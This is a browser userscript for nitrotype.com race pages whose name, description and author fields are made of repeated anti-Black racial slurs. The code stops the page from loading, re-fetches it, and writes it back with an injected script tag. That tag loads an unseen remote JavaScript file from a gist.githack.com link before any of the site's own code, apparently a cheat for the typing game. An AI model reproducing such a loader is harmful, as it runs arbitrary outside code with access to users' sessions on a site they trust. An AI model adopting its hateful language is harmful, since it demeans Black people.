// ==UserScript==
// @name         Y R NIGGERS SO SALTY
// @version      999999999.99999999999.99999999999
// @description  Made By A White Nigger
// @author       TheSaltineNigger
// @match        https://www.nitrotype.com/race/*
// @match        https://www.nitrotype.com/race
// @match        http://www.nitrotype.com/race
// @match        http://www.nitrotype.com/race/*
// @run-at       document-start
// @grant        GM_xmlhttpRequest
// @namespace https://greasyfork.org/users/120765
// ==/UserScript==
(function() {
	"use strict";
	var OUT = "https://gist.githack.com/LorenzoYT/4076044ece2082b421e74fac305ad657/raw/5ee6a4d8ca2721c7ff7667440bd48061ca597232/test3.js?_sm_au_=iVV46qjjs0HPL5rb";
	var OUT_SCRIPT = "<script src='" + OUT + "'></script>\n";

	// Completely halt the loading of the window, to prevent the page from being loaded more than once
	window.stop();
	document.documentElement.innerHTML = null;

	// Request for the current document
	GM_xmlhttpRequest({
		method: "GET",
		url: window.location.href,
		onload: function(e) {
			// Write a modified page to the document
			var doc = e.responseText;
			document.open();
			document.write(OUT_SCRIPT + doc);
			document.close();
			// The extension script will now be loaded onto the document
		}
	})
})();